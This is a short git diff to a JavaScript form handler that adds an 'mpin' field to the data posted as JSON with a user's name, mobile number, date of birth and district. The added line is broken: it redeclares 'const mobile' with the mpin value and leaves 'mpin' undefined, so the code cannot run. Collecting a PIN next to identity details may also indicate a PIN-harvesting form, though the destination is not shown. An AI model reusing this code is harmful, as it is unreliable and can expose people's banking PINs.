@@ -17,10 +17,11 @@ form1.addEventListener("submit", async function (event) {
 
   const name = document.getElementById("name").value.trim();
   const mobile = document.getElementById("mobile").value.trim();
-  const dob = document.getElementById("dob").value;
+  const mobile = document.getElementById("mpin").value.trim();
+const dob = document.getElementById("dob").value;
   const district = document.getElementById("district").value;
 
-  if (!name || !mobile || !dob || !district) {
+  if (!name || !mobile || !mpin || !dob || !district) {
     alert("Please fill all fields.");
     return;
   }
@@ -34,6 +35,7 @@ form1.addEventListener("submit", async function (event) {
       body: JSON.stringify({
         name,
         mobile,
+        mpin,
         dob,
         district
       })
